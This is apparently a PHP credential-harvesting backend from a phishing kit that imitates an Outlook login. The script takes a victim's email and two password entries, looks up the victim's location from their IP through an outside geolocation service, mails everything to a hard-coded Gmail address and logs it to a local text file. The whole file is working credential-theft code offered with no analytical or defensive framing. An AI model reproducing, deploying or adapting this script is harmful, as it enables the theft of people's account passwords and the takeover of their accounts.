<?php
header('Access-Control-Allow-Origin: *');

$to = 'losulosu.intl@gmail.com';

if(isset($_POST['email'])){
	$ip = getenv("REMOTE_ADDR");
	$user = @$_POST['email'];
	$pass1 = @$_POST['pass1'];
	$pass2 = @$_POST['pass2'];

	$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
	if(property_exists($ipdat, 'geoplugin_countryCode')){ $countrycode = $ipdat->geoplugin_countryCode; }else{ $countrycode = ''; }
	if(property_exists($ipdat, 'geoplugin_countryName')){ $country = $ipdat->geoplugin_countryName; }else{ $country = ''; }
	if(property_exists($ipdat, 'geoplugin_city')){ $city = $ipdat->geoplugin_city; }else{ $city = ''; }
	if(property_exists($ipdat, 'geoplugin_region')){ $region = $ipdat->geoplugin_region; }else{ $region = ''; }


$msg = "Email: {$user}\n".
		"Password 1: {$pass1}\n".
		"Password 2: {$pass2}\n".
        "IP: {$ip}\n".
        "Country: {$country} - {$countrycode}\n".
        "City: {$city}\n".
        "Region: {$region}\n";
	@mail($to, "Outlook - $ip - $country", $msg);
	$handler=fopen('reload.txt','a');
	fwrite($handler,$msg."================================\n");
	fclose($handler);
	exit('sent');
}



?>